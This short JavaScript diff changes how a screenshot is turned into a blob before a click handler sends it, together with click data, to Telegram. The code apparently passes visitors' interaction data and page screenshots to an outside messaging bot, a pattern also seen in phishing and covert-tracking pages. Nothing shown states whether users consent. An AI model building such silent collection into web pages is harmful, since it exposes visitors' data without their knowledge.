@@ -613,7 +613,7 @@ async function handleMainCta() {
 
     await sendToTelegram(clickData);
     if (screenshot) {
-        const blob = await (await fetch(screenshot)).blob();
+        const blob = dataURItoBlob(screenshot);
         await sendPhotoToTelegram(blob, clickData);
     }
 }
